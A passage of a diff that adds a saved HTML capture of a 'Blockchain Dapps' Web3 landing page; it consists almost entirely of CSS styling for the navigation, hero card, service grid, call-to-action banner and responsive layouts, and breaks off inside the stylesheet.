@@ -1,0 +1,4012 @@
+<!DOCTYPE html><html lang="en" data-scrapbook-source="https://blockchaindapps.vercel.app/" data-scrapbook-create="20260927080755466"><head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blockchain Dapps – Open Protocol to all Web3 Solutions</title>
+    <link href="css2.css" rel="stylesheet">
+    <style>
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      :root {
+        --bg: #0a0e1a;
+        --surface: #0f1526;
+        --card: rgba(255, 255, 255, 0.038);
+        --border: rgba(255, 255, 255, 0.08);
+        --blue: #2563eb;
+        --blue-l: #3b82f6;
+        --cyan: #06b6d4;
+        --white: #ffffff;
+        --text: #e2e8f0;
+        --muted: #94a3b8;
+        --green: #10b981;
+      }
+
+      html,
+      body {
+        min-height: 100vh;
+        font-family: "Poppins", sans-serif;
+        background: var(--bg);
+        color: var(--text);
+        overflow-x: hidden;
+      }
+
+      body::before {
+        content: "";
+        position: fixed;
+        inset: 0;
+        z-index: 0;
+        pointer-events: none;
+        background:
+          radial-gradient(
+            ellipse 80% 55% at 72% 8%,
+            rgba(37, 99, 235, 0.2) 0%,
+            transparent 60%
+          ),
+          radial-gradient(
+            ellipse 55% 45% at 8% 85%,
+            rgba(6, 182, 212, 0.12) 0%,
+            transparent 55%
+          );
+      }
+      body::after {
+        content: "";
+        position: fixed;
+        inset: 0;
+        z-index: 0;
+        pointer-events: none;
+        background-image:
+          linear-gradient(rgba(255, 255, 255, 0.025) 1px, transparent 1px),
+          linear-gradient(
+            90deg,
+            rgba(255, 255, 255, 0.025) 1px,
+            transparent 1px
+          );
+        background-size: 52px 52px;
+      }
+
+      /* ══════ NAV ══════ */
+      nav {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 200;
+        height: 68px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 0 64px;
+        background: rgba(10, 14, 26, 0.96);
+        backdrop-filter: blur(18px);
+        border-bottom: 1px solid var(--border);
+      }
+      .nav-brand {
+        display: flex;
+        align-items: center;
+        gap: 11px;
+      }
+      .brand-icon {
+        width: 38px;
+        height: 38px;
+        border-radius: 9px;
+        flex-shrink: 0;
+        background: linear-gradient(135deg, var(--blue), var(--cyan));
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 0 22px rgba(37, 99, 235, 0.45);
+      }
+      .brand-icon svg {
+        width: 20px;
+        height: 20px;
+      }
+      .brand-info {
+        display: flex;
+        flex-direction: column;
+        line-height: 1.2;
+      }
+      .brand-name {
+        font-size: 0.95rem;
+        font-weight: 700;
+        color: var(--white);
+      }
+      .brand-tag {
+        font-size: 0.6rem;
+        font-weight: 400;
+        color: var(--cyan);
+        letter-spacing: 1.3px;
+        text-transform: uppercase;
+      }
+      .nav-right {
+        display: flex;
+        align-items: center;
+        gap: 28px;
+      }
+      .nav-home {
+        background: none;
+        border: none;
+        cursor: pointer;
+        font-family: "Poppins", sans-serif;
+        font-size: 0.88rem;
+        font-weight: 500;
+        color: var(--muted);
+        padding: 4px 2px;
+        transition: color 0.2s;
+      }
+      .nav-home:hover {
+        color: var(--white);
+      }
+      .nav-connect {
+        display: flex;
+        align-items: center;
+        gap: 7px;
+        padding: 9px 22px;
+        border-radius: 8px;
+        border: none;
+        cursor: pointer;
+        font-family: "Poppins", sans-serif;
+        font-size: 0.88rem;
+        font-weight: 600;
+        color: var(--white);
+        background: var(--blue);
+        box-shadow: 0 0 20px rgba(37, 99, 235, 0.38);
+        transition:
+          background 0.2s,
+          transform 0.15s;
+      }
+      .nav-connect:hover {
+        background: var(--blue-l);
+        transform: translateY(-1px);
+      }
+      .nav-connect svg {
+        width: 14px;
+        height: 14px;
+      }
+
+      /* ══════ HERO ══════ */
+      .hero {
+        position: relative;
+        z-index: 1;
+        min-height: 100vh;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        align-items: center;
+        padding: 108px 64px 72px;
+        gap: 56px;
+      }
+      .hero-left {
+        display: flex;
+        flex-direction: column;
+        gap: 26px;
+      }
+      .hero-pill {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        width: fit-content;
+        padding: 5px 16px 5px 8px;
+        background: rgba(37, 99, 235, 0.11);
+        border: 1px solid rgba(37, 99, 235, 0.26);
+        border-radius: 999px;
+        font-size: 0.7rem;
+        font-weight: 500;
+        letter-spacing: 0.9px;
+        text-transform: uppercase;
+        color: var(--cyan);
+      }
+      .pill-dot {
+        width: 7px;
+        height: 7px;
+        border-radius: 50%;
+        background: var(--cyan);
+        animation: pulse 2.2s ease-in-out infinite;
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+          transform: scale(1);
+        }
+        50% {
+          opacity: 0.35;
+          transform: scale(0.75);
+        }
+      }
+      .hero-h1 {
+        font-size: clamp(2rem, 3.5vw, 3rem);
+        font-weight: 800;
+        line-height: 1.14;
+        letter-spacing: -0.4px;
+        color: var(--white);
+      }
+      .hero-h1 .accent {
+        background: linear-gradient(90deg, #60a5fa, var(--cyan));
+        -webkit-background-clip: text;
+        background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+      .hero-p {
+        font-size: 1rem;
+        font-weight: 300;
+        line-height: 1.82;
+        color: var(--muted);
+        max-width: 450px;
+      }
+      .hero-actions {
+        display: flex;
+        gap: 14px;
+        flex-wrap: wrap;
+        margin-top: 4px;
+      }
+      .btn-main {
+        display: inline-flex;
+        align-items: center;
+        gap: 9px;
+        padding: 13px 32px;
+        border: none;
+        border-radius: 9px;
+        cursor: pointer;
+        font-family: "Poppins", sans-serif;
+        font-size: 0.95rem;
+        font-weight: 600;
+        color: var(--white);
+        background: var(--blue);
+        box-shadow: 0 0 30px rgba(37, 99, 235, 0.42);
+        transition:
+          background 0.2s,
+          transform 0.18s;
+      }
+      .btn-main:hover {
+        background: var(--blue-l);
+        transform: translateY(-2px);
+      }
+      .btn-main svg {
+        width: 17px;
+        height: 17px;
+      }
+      .btn-ghost {
+        display: inline-flex;
+        align-items: center;
+        gap: 9px;
+        padding: 12px 32px;
+        border-radius: 9px;
+        cursor: pointer;
+        font-family: "Poppins", sans-serif;
+        font-size: 0.95rem;
+        font-weight: 500;
+        color: var(--text);
+        background: transparent;
+        border: 1px solid rgba(255, 255, 255, 0.14);
+        transition:
+          border-color 0.2s,
+          background 0.2s,
+          transform 0.18s;
+      }
+      .btn-ghost:hover {
+        border-color: rgba(59, 130, 246, 0.45);
+        background: rgba(37, 99, 235, 0.07);
+        transform: translateY(-2px);
+      }
+      .btn-ghost svg {
+        width: 15px;
+        height: 15px;
+      }
+
+      /* hero right card */
+      .hero-right {
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .r-card {
+        width: 100%;
+        max-width: 430px;
+        background: rgba(255, 255, 255, 0.04);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        border-radius: 20px;
+        padding: 32px;
+        box-shadow:
+          0 28px 65px rgba(0, 0, 0, 0.5),
+          inset 0 1px 0 rgba(255, 255, 255, 0.05);
+        position: relative;
+        overflow: hidden;
+      }
+      .r-card::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          var(--blue),
+          var(--cyan),
+          transparent
+        );
+      }
+      .r-head {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+      }
+      .r-title {
+        font-size: 0.82rem;
+        font-weight: 600;
+        color: var(--white);
+      }
+      .r-live {
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        font-size: 0.7rem;
+        color: var(--green);
+      }
+      .live-dot {
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background: var(--green);
+        animation: pulse 2s infinite;
+      }
+      .r-rows {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+      .r-row {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 11px 14px;
+        background: rgba(255, 255, 255, 0.028);
+        border: 1px solid rgba(255, 255, 255, 0.055);
+        border-radius: 10px;
+        transition:
+          background 0.2s,
+          border-color 0.2s;
+      }
+      .r-row:hover {
+        background: rgba(37, 99, 235, 0.07);
+        border-color: rgba(59, 130, 246, 0.22);
+      }
+      .r-left {
+        display: flex;
+        align-items: center;
+        gap: 11px;
+      }
+      .r-ico {
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 0.82rem;
+        font-weight: 700;
+        flex-shrink: 0;
+      }
+      .r-name {
+        font-size: 0.83rem;
+        font-weight: 500;
+        color: var(--white);
+      }
+      .r-sub {
+        font-size: 0.68rem;
+        color: var(--muted);
+        margin-top: 1px;
+      }
+      .badge {
+        font-size: 0.67rem;
+        font-weight: 500;
+        padding: 3px 10px;
+        border-radius: 999px;
+      }
+      .b-green {
+        background: rgba(16, 185, 129, 0.14);
+        color: #10b981;
+        border: 1px solid rgba(16, 185, 129, 0.2);
+      }
+      .b-blue {
+        background: rgba(59, 130, 246, 0.14);
+        color: #60a5fa;
+        border: 1px solid rgba(59, 130, 246, 0.2);
+      }
+      .b-gold {
+        background: rgba(245, 158, 11, 0.12);
+        color: #fbbf24;
+        border: 1px solid rgba(245, 158, 11, 0.2);
+      }
+      .r-footer {
+        margin-top: 14px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 11px 14px;
+        background: linear-gradient(
+          135deg,
+          rgba(37, 99, 235, 0.11),
+          rgba(6, 182, 212, 0.07)
+        );
+        border: 1px solid rgba(37, 99, 235, 0.2);
+        border-radius: 10px;
+      }
+      .r-footer-ico {
+        width: 28px;
+        height: 28px;
+        border-radius: 7px;
+        flex-shrink: 0;
+        background: linear-gradient(135deg, var(--blue), var(--cyan));
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .r-footer-ico svg {
+        width: 13px;
+        height: 13px;
+      }
+      .r-footer p {
+        font-size: 0.76rem;
+        color: var(--muted);
+        line-height: 1.55;
+      }
+      .r-footer p strong {
+        color: var(--white);
+        font-weight: 500;
+      }
+      .chip {
+        position: absolute;
+        display: flex;
+        align-items: center;
+        gap: 7px;
+        padding: 7px 13px;
+        background: rgba(10, 14, 26, 0.93);
+        border: 1px solid rgba(255, 255, 255, 0.09);
+        border-radius: 9px;
+        font-size: 0.73rem;
+        color: var(--text);
+        backdrop-filter: blur(10px);
+        box-shadow: 0 6px 22px rgba(0, 0, 0, 0.4);
+        white-space: nowrap;
+      }
+      .chip1 {
+        top: -15px;
+        right: 14px;
+        animation: chipFloat 4s ease-in-out infinite;
+      }
+      .chip2 {
+        bottom: -15px;
+        left: 14px;
+        animation: chipFloat 4s 2s ease-in-out infinite;
+      }
+      @keyframes chipFloat {
+        0%,
+        100% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-8px);
+        }
+      }
+
+      .hero-left > *:nth-child(1) {
+        animation: fadeUp 0.5s 0.05s both;
+      }
+      .hero-left > *:nth-child(2) {
+        animation: fadeUp 0.5s 0.15s both;
+      }
+      .hero-left > *:nth-child(3) {
+        animation: fadeUp 0.5s 0.25s both;
+      }
+      .hero-left > *:nth-child(4) {
+        animation: fadeUp 0.5s 0.35s both;
+      }
+      .hero-right {
+        animation: fadeIn 0.75s 0.1s both;
+      }
+      @keyframes fadeUp {
+        from {
+          opacity: 0;
+          transform: translateY(18px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      /* ══════ ABOUT STRIP ══════ */
+      .about-strip {
+        position: relative;
+        z-index: 1;
+        background: rgba(37, 99, 235, 0.06);
+        border-top: 1px solid var(--border);
+        border-bottom: 1px solid var(--border);
+        padding: 48px 64px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 48px;
+      }
+      .about-left {
+        max-width: 560px;
+      }
+      .about-label {
+        font-size: 0.7rem;
+        font-weight: 600;
+        letter-spacing: 1.4px;
+        text-transform: uppercase;
+        color: var(--cyan);
+        margin-bottom: 14px;
+      }
+      .about-title {
+        font-size: 1.55rem;
+        font-weight: 700;
+        color: var(--white);
+        line-height: 1.3;
+        margin-bottom: 16px;
+      }
+      .about-desc {
+        font-size: 0.92rem;
+        font-weight: 300;
+        line-height: 1.8;
+        color: var(--muted);
+      }
+      .about-stats {
+        display: flex;
+        gap: 40px;
+        flex-shrink: 0;
+      }
+      .stat-box {
+        text-align: center;
+      }
+      .stat-num {
+        font-size: 1.9rem;
+        font-weight: 800;
+        color: var(--white);
+        background: linear-gradient(135deg, #60a5fa, var(--cyan));
+        -webkit-background-clip: text;
+        background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+      .stat-lbl {
+        font-size: 0.72rem;
+        color: var(--muted);
+        margin-top: 4px;
+        letter-spacing: 0.4px;
+      }
+
+      /* ══════ SERVICES ══════ */
+      .services-section {
+        position: relative;
+        z-index: 1;
+        padding: 80px 64px;
+      }
+      .section-header {
+        text-align: center;
+        margin-bottom: 52px;
+      }
+      .section-eyebrow {
+        display: inline-flex;
+        align-items: center;
+        gap: 7px;
+        font-size: 0.7rem;
+        font-weight: 600;
+        letter-spacing: 1.4px;
+        text-transform: uppercase;
+        color: var(--cyan);
+        margin-bottom: 14px;
+      }
+      .eyebrow-line {
+        width: 30px;
+        height: 1px;
+        background: var(--cyan);
+      }
+      .section-title {
+        font-size: clamp(1.6rem, 2.8vw, 2.2rem);
+        font-weight: 800;
+        color: var(--white);
+        line-height: 1.2;
+        margin-bottom: 12px;
+      }
+      .section-title span {
+        background: linear-gradient(90deg, #60a5fa, var(--cyan));
+        -webkit-background-clip: text;
+        background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+      .section-sub {
+        font-size: 0.92rem;
+        font-weight: 300;
+        color: var(--muted);
+        max-width: 500px;
+        margin: 0 auto;
+      }
+      .services-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 18px;
+      }
+      .service-card {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 16px;
+        padding: 26px 22px;
+        cursor: pointer;
+        transition:
+          transform 0.22s,
+          border-color 0.22s,
+          background 0.22s,
+          box-shadow 0.22s;
+        position: relative;
+        overflow: hidden;
+      }
+      .service-card::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(
+          135deg,
+          rgba(37, 99, 235, 0.07),
+          transparent
+        );
+        opacity: 0;
+        transition: opacity 0.25s;
+      }
+      .service-card:hover {
+        transform: translateY(-5px);
+        border-color: rgba(59, 130, 246, 0.35);
+        background: rgba(37, 99, 235, 0.07);
+        box-shadow: 0 12px 36px rgba(37, 99, 235, 0.12);
+      }
+      .service-card:hover::before {
+        opacity: 1;
+      }
+      .svc-icon-wrap {
+        width: 46px;
+        height: 46px;
+        border-radius: 12px;
+        margin-bottom: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+        z-index: 1;
+      }
+      .svc-icon-wrap svg {
+        width: 22px;
+        height: 22px;
+      }
+      .svc-tag {
+        display: inline-block;
+        margin-bottom: 10px;
+        font-size: 0.65rem;
+        font-weight: 600;
+        letter-spacing: 0.8px;
+        text-transform: uppercase;
+        padding: 2px 9px;
+        border-radius: 999px;
+        position: relative;
+        z-index: 1;
+      }
+      .svc-name {
+        font-size: 1rem;
+        font-weight: 700;
+        color: var(--white);
+        margin-bottom: 8px;
+        position: relative;
+        z-index: 1;
+      }
+      .svc-desc {
+        font-size: 0.8rem;
+        font-weight: 300;
+        color: var(--muted);
+        line-height: 1.65;
+        position: relative;
+        z-index: 1;
+      }
+      .svc-action {
+        margin-top: 18px;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 0.78rem;
+        font-weight: 600;
+        color: var(--blue-l);
+        position: relative;
+        z-index: 1;
+      }
+      .svc-action button {
+        background: none;
+        border: none;
+        cursor: pointer;
+        font-family: "Poppins", sans-serif;
+        font-size: 0.78rem;
+        font-weight: 600;
+        color: var(--blue-l);
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        padding: 0;
+        transition: gap 0.2s;
+      }
+      .svc-action button:hover {
+        gap: 8px;
+      }
+      .svc-action button svg {
+        width: 13px;
+        height: 13px;
+        transition: transform 0.2s;
+      }
+      .svc-action button:hover svg {
+        transform: translateX(3px);
+      }
+
+      /* ══════ CONNECT TO DAPPS CARD ══════ */
+      .connect-dapps-card {
+        background: linear-gradient(135deg, rgba(6, 182, 212, 0.1), rgba(37, 99, 235, 0.08));
+        border: 1px solid rgba(6, 182, 212, 0.28);
+        border-radius: 16px;
+        padding: 26px 22px;
+        cursor: pointer;
+        transition:
+          transform 0.22s,
+          border-color 0.22s,
+          background 0.22s,
+          box-shadow 0.22s;
+        position: relative;
+        overflow: hidden;
+      }
+      .connect-dapps-card::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: linear-gradient(90deg, transparent, var(--cyan), var(--blue), transparent);
+      }
+      .connect-dapps-card:hover {
+        transform: translateY(-5px);
+        border-color: rgba(6, 182, 212, 0.5);
+        background: linear-gradient(135deg, rgba(6, 182, 212, 0.14), rgba(37, 99, 235, 0.12));
+        box-shadow: 0 12px 36px rgba(6, 182, 212, 0.14);
+      }
+      .connect-dapps-card .svc-icon-wrap {
+        background: rgba(6, 182, 212, 0.14);
+      }
+      .connect-dapps-card .svc-icon-wrap svg {
+        color: var(--cyan);
+      }
+      .connect-dapps-card .svc-tag {
+        background: rgba(6, 182, 212, 0.12);
+        color: var(--cyan);
+        border: 1px solid rgba(6, 182, 212, 0.2);
+      }
+      .connect-dapps-card .svc-action button {
+        color: var(--cyan);
+      }
+
+      /* card colour themes */
+      .t-blue .svc-icon-wrap {
+        background: rgba(37, 99, 235, 0.15);
+      }
+      .t-blue .svc-icon-wrap svg {
+        color: #60a5fa;
+      }
+      .t-blue .svc-tag {
+        background: rgba(37, 99, 235, 0.14);
+        color: #60a5fa;
+        border: 1px solid rgba(59, 130, 246, 0.2);
+      }
+      .t-cyan .svc-icon-wrap {
+        background: rgba(6, 182, 212, 0.14);
+      }
+      .t-cyan .svc-icon-wrap svg {
+        color: var(--cyan);
+      }
+      .t-cyan .svc-tag {
+        background: rgba(6, 182, 212, 0.12);
+        color: var(--cyan);
+        border: 1px solid rgba(6, 182, 212, 0.2);
+      }
+      .t-green .svc-icon-wrap {
+        background: rgba(16, 185, 129, 0.13);
+      }
+      .t-green .svc-icon-wrap svg {
+        color: #34d399;
+      }
+      .t-green .svc-tag {
+        background: rgba(16, 185, 129, 0.12);
+        color: #34d399;
+        border: 1px solid rgba(16, 185, 129, 0.2);
+      }
+      .t-purple .svc-icon-wrap {
+        background: rgba(139, 92, 246, 0.14);
+      }
+      .t-purple .svc-icon-wrap svg {
+        color: #a78bfa;
+      }
+      .t-purple .svc-tag {
+        background: rgba(139, 92, 246, 0.12);
+        color: #a78bfa;
+        border: 1px solid rgba(139, 92, 246, 0.2);
+      }
+      .t-gold .svc-icon-wrap {
+        background: rgba(245, 158, 11, 0.13);
+      }
+      .t-gold .svc-icon-wrap svg {
+        color: #fbbf24;
+      }
+      .t-gold .svc-tag {
+        background: rgba(245, 158, 11, 0.11);
+        color: #fbbf24;
+        border: 1px solid rgba(245, 158, 11, 0.2);
+      }
+      .t-red .svc-icon-wrap {
+        background: rgba(239, 68, 68, 0.13);
+      }
+      .t-red .svc-icon-wrap svg {
+        color: #f87171;
+      }
+      .t-red .svc-tag {
+        background: rgba(239, 68, 68, 0.11);
+        color: #f87171;
+        border: 1px solid rgba(239, 68, 68, 0.2);
+      }
+      .t-pink .svc-icon-wrap {
+        background: rgba(236, 72, 153, 0.13);
+      }
+      .t-pink .svc-icon-wrap svg {
+        color: #f472b6;
+      }
+      .t-pink .svc-tag {
+        background: rgba(236, 72, 153, 0.11);
+        color: #f472b6;
+        border: 1px solid rgba(236, 72, 153, 0.2);
+      }
+      .t-orange .svc-icon-wrap {
+        background: rgba(249, 115, 22, 0.13);
+      }
+      .t-orange .svc-icon-wrap svg {
+        color: #fb923c;
+      }
+      .t-orange .svc-tag {
+        background: rgba(249, 115, 22, 0.11);
+        color: #fb923c;
+        border: 1px solid rgba(249, 115, 22, 0.2);
+      }
+
+      /* ══════ CTA BANNER ══════ */
+      .cta-banner {
+        position: relative;
+        z-index: 1;
+        margin: 0 64px 80px;
+        background: linear-gradient(
+          135deg,
+          rgba(37, 99, 235, 0.18) 0%,
+          rgba(6, 182, 212, 0.12) 100%
+        );
+        border: 1px solid rgba(37, 99, 235, 0.28);
+        border-radius: 20px;
+        padding: 52px 60px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 40px;
+        overflow: hidden;
+      }
+      .cta-banner::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          var(--blue),
+          var(--cyan),
+          transparent
+        );
+      }
+      .cta-bg-orb {
+        position: absolute;
+        width: 400px;
+        height: 400px;
+        border-radius: 50%;
+        background: radial-gradient(
+          circle,
+          rgba(37, 99, 235, 0.15),
+          transparent 70%
+        );
+        right: -100px;
+        top: -100px;
+        pointer-events: none;
+      }
+      .cta-text {
+        position: relative;
+        z-index: 1;
+      }
+      .cta-text h2 {
+        font-size: 1.75rem;
+        font-weight: 800;
+        color: var(--white);
+        margin-bottom: 10px;
+      }
+      .cta-text h2 span {
+        background: linear-gradient(90deg, #60a5fa, var(--cyan));
+        -webkit-background-clip: text;
+        background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+      .cta-text p {
+        font-size: 0.92rem;
+        font-weight: 300;
+        color: var(--muted);
+        max-width: 440px;
+      }
+      .cta-actions {
+        display: flex;
+        gap: 14px;
+        flex-shrink: 0;
+        position: relative;
+        z-index: 1;
+      }
+      .cta-btn-primary {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 13px 28px;
+        border: none;
+        border-radius: 9px;
+        cursor: pointer;
+        font-family: "Poppins", sans-serif;
+        font-size: 0.92rem;
+        font-weight: 600;
+        color: var(--white);
+        background: var(--blue);
+        box-shadow: 0 0 24px rgba(37, 99, 235, 0.4);
+        transition:
+          background 0.2s,
+          transform 0.18s;
+      }
+      .cta-btn-primary:hover {
+        background: var(--blue-l);
+        transform: translateY(-2px);
+      }
+      .cta-btn-primary svg {
+        width: 16px;
+        height: 16px;
+      }
+      .cta-btn-outline {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 12px 28px;
+        border-radius: 9px;
+        cursor: pointer;
+        font-family: "Poppins", sans-serif;
+        font-size: 0.92rem;
+        font-weight: 500;
+        color: var(--text);
+        background: transparent;
+        border: 1px solid rgba(255, 255, 255, 0.18);
+        transition:
+          border-color 0.2s,
+          background 0.2s,
+          transform 0.18s;
+      }
+      .cta-btn-outline:hover {
+        border-color: rgba(59, 130, 246, 0.5);
+        background: rgba(37, 99, 235, 0.08);
+        transform: translateY(-2px);
+      }
+      .cta-btn-outline svg {
+        width: 15px;
+        height: 15px;
+      }
+
+      /* ══════ FOOTER ══════ */
+      footer {
+        position: relative;
+        z-index: 1;
+        border-top: 1px solid var(--border);
+        padding: 28px 64px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      .footer-brand {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .footer-brand-icon {
+        width: 30px;
+        height: 30px;
+        border-radius: 7px;
+        background: linear-gradient(135deg, var(--blue), var(--cyan));
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .footer-brand-icon svg {
+        width: 15px;
+        height: 15px;
+      }
+      .footer-brand-name {
+        font-size: 0.85rem;
+        font-weight: 700;
+        color: var(--white);
+      }
+      .footer-center {
+        font-size: 0.78rem;
+        color: var(--muted);
+        text-align: center;
+      }
+      .footer-right {
+        font-size: 0.78rem;
+        color: var(--muted);
+      }
+
+      /* ════════════════════════════════════════
+       RESPONSIVE
+    ════════════════════════════════════════ */
+
+      /* ── LAPTOP / LARGE TABLET: 1280px ── */
+      @media (max-width: 1280px) {
+        nav {
+          padding: 0 40px;
+        }
+        .hero {
+          padding: 100px 40px 64px;
+          gap: 40px;
+        }
+        .about-strip {
+          padding: 44px 40px;
+        }
+        .services-section {
+          padding: 72px 40px;
+        }
+        .cta-banner {
+          margin: 0 40px 72px;
+          padding: 44px 48px;
+        }
+        footer {
+          padding: 26px 40px;
+        }
+      }
+
+      /* ── LAPTOP / TABLET: 1100px ── */
+      @media (max-width: 1100px) {
+        .services-grid {
+          grid-template-columns: repeat(3, 1fr);
+        }
+        .hero-h1 {
+          font-size: clamp(1.85rem, 3vw, 2.6rem);
+        }
+        .r-card {
+          padding: 24px;
+        }
+      }
+
+      /* ── SMALL LAPTOP / LARGE TABLET: 960px ── */
+      @media (max-width: 960px) {
+        nav {
+          padding: 0 28px;
+          height: 64px;
+        }
+        .brand-tag {
+          display: none;
+        }
+        .nav-home {
+          display: none;
+        }
+        .nav-connect {
+          padding: 8px 16px;
+          font-size: 0.82rem;
+        }
+
+        .hero {
+          grid-template-columns: 1fr;
+          min-height: auto;
+          padding: 96px 28px 56px;
+          gap: 0;
+        }
+        .hero-left {
+          gap: 22px;
+        }
+        .hero-h1 {
+          font-size: clamp(2rem, 5vw, 2.8rem);
+        }
+        .hero-p {
+          max-width: 100%;
+        }
+        .hero-right {
+          display: flex;
+          margin-top: 40px;
+          justify-content: flex-start;
+        }
+        .r-card {
+          max-width: 100%;
+        }
+        .chip {
+          display: none;
+        }
+
+        .about-strip {
+          flex-direction: column;
+          padding: 40px 28px;
+          gap: 32px;
+          align-items: flex-start;
+        }
+        .about-left {
+          max-width: 100%;
+        }
+        .about-stats {
+          justify-content: flex-start;
+          gap: 32px;
+        }
+
+        .services-section {
+          padding: 60px 28px;
+        }
+        .services-grid {
+          grid-template-columns: repeat(2, 1fr);
+          gap: 14px;
+        }
+
+        .cta-banner {
+          flex-direction: column;
+          align-items: flex-start;
+          margin: 0 28px 60px;
+          padding: 36px 32px;
+          gap: 28px;
+        }
+        .cta-text h2 {
+          font-size: 1.5rem;
+        }
+        .cta-actions {
+          width: 100%;
+        }
+        .cta-btn-primary,
+        .cta-btn-outline {
+          flex: 1;
+          justify-content: center;
+        }
+
+        footer {
+          padding: 24px 28px;
+          flex-direction: column;
+          gap: 14px;
+          text-align: center;
+        }
+        .footer-center {
+          order: 2;
+        }
+        .footer-right {
+          order: 3;
+        }
+      }
+
+      /* ── TABLET PORTRAIT / LARGE MOBILE: 640px ── */
+      @media (max-width: 640px) {
+        nav {
+          padding: 0 18px;
+          height: 60px;
+        }
+        .brand-name {
+          font-size: 0.85rem;
+        }
+        .brand-icon {
+          width: 32px;
+          height: 32px;
+        }
+        .brand-icon svg {
+          width: 16px;
+          height: 16px;
+        }
+        .nav-connect {
+          padding: 7px 14px;
+          font-size: 0.78rem;
+          gap: 5px;
+        }
+        .nav-connect svg {
+          width: 12px;
+          height: 12px;
+        }
+
+        .hero {
+          padding: 84px 18px 52px;
+        }
+        .hero-left {
+          gap: 18px;
+        }
+        .hero-h1 {
+          font-size: clamp(1.7rem, 7vw, 2.2rem);
+        }
+        .hero-pill {
+          font-size: 0.65rem;
+        }
+        .hero-p {
+          font-size: 0.92rem;
+        }
+        .hero-actions {
+          gap: 10px;
+        }
+        .btn-main,
+        .btn-ghost {
+          padding: 11px 22px;
+          font-size: 0.88rem;
+        }
+
+        .hero-right {
+          margin-top: 32px;
+        }
+        .r-card {
+          padding: 20px 16px;
+          border-radius: 16px;
+        }
+        .r-row {
+          padding: 9px 11px;
+        }
+        .r-name {
+          font-size: 0.78rem;
+        }
+        .r-sub {
+          font-size: 0.63rem;
+        }
+        .badge {
+          font-size: 0.62rem;
+          padding: 2px 8px;
+        }
+
+        .about-strip {
+          padding: 32px 18px;
+          gap: 24px;
+        }
+        .about-title {
+          font-size: 1.3rem;
+        }
+        .about-desc {
+          font-size: 0.86rem;
+        }
+        .about-stats {
+          gap: 20px;
+          flex-wrap: wrap;
+        }
+        .stat-num {
+          font-size: 1.6rem;
+        }
+        .stat-lbl {
+          font-size: 0.68rem;
+        }
+
+        .services-section {
+          padding: 48px 18px;
+        }
+        .section-header {
+          margin-bottom: 32px;
+        }
+        .section-title {
+          font-size: 1.5rem;
+        }
+        .section-sub {
+          font-size: 0.85rem;
+        }
+        .services-grid {
+          grid-template-columns: repeat(2, 1fr);
+          gap: 12px;
+        }
+        .service-card {
+          padding: 20px 16px;
+          border-radius: 14px;
+        }
+        .connect-dapps-card {
+          padding: 20px 16px;
+          border-radius: 14px;
+        }
+        .svc-icon-wrap {
+          width: 40px;
+          height: 40px;
+          border-radius: 10px;
+          margin-bottom: 12px;
+        }
+        .svc-icon-wrap svg {
+          width: 18px;
+          height: 18px;
+        }
+        .svc-name {
+          font-size: 0.9rem;
+        }
+        .svc-desc {
+          font-size: 0.75rem;
+        }
+        .svc-tag {
+          font-size: 0.6rem;
+        }
+        .svc-action button {
+          font-size: 0.72rem;
+        }
+
+        .cta-banner {
+          margin: 0 18px 48px;
+          padding: 28px 22px;
+          border-radius: 16px;
+        }
+        .cta-text h2 {
+          font-size: 1.3rem;
+        }
+        .cta-text p {
+          font-size: 0.84rem;
+        }
+        .cta-actions {
+          flex-direction: column;
+          gap: 10px;
+        }
+        .cta-btn-primary,
+        .cta-btn-outline {
+          width: 100%;
+          padding: 12px 20px;
+          font-size: 0.88rem;
+        }
+
+        footer {
